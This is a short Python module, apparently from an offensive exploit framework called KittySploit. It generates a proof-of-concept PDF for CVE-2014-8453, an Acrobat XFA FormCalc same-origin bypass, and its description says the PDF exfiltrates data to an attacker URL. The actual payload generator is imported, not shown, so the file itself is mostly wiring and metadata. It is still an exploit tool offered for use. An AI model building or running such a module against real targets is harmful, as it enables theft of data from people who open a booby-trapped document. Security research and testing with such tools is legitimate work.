#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.xfa import write_xfa_formcalc_post


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2014-8453 FormCalc Post Exfil',
        "description": 'Generate PDF PoC for CVE-2014-8453: XFA FormCalc Post() same-origin policy bypass exfiltrating data to attacker URL.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2014-8453'],
        "references": ['https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html'],
        "tags": ['pdf', 'cve-2014-8453', 'xfa', 'formcalc', 'acrobat'],
    }

    PDF_GENERATORS = (
        write_xfa_formcalc_post,
    )

    CVE_IDS = ['CVE-2014-8453']
    MODULE_TITLE = 'PDF CVE-2014-8453 FormCalc Post Exfil'

    def run(self):
        return self.run_pdf_cve()